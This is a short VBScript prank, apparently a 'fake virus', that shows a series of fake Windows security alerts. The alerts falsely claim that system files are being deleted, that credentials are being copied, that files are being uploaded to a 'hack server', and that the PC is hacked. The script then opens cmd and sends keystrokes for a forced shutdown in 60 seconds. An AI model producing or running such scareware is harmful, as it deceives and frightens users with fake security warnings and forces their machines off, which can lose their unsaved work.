
X=MsgBox("Error while opening this file, do you want us to fix the problem?",4+64,"Error (0x6437SG73)")
X=MsgBox("Unable to fix the issue. Do you want us to scan your Computer?",3+48,"Windows Security Alert!")
X=MsgBox("Threat has been detected. Do you want to delete this program?",3+16,"Threat Found! Action needed") 
X=MsgBox("Unable to delete this threat",1+64,"Critical Error") 
X=MsgBox("Virus is Activated",2+16,"Virus Alert") 
X=MsgBox("Deleting System Files..",2+16,"File Deletion") 
X=MsgBox("Copying your credentials",2+48,"Virus Alert")
X=MsgBox("Please wait. Uploading your files to hack server. Do you want to stop it?",4+64,"Transfering files....")
X=MsgBox("Can not stop.Access is denied. File transfer Completed",1+16,"Completed")   
X=MsgBox("Your computer is hacked by LOLsec",1+68,"Error (0x64GBHSG73)") 
X=MsgBox("Your PC ran into a problem and needs to restart :(",1+48,"Firewall Alert!") 

set shellobj = CreateObject("WScript.Shell")
shellobj.run "cmd"

wscript.sleep 2000
shellobj.sendkeys "shutdown -s -f -t 60"
Shellobj.sendkeys "{ENTER}"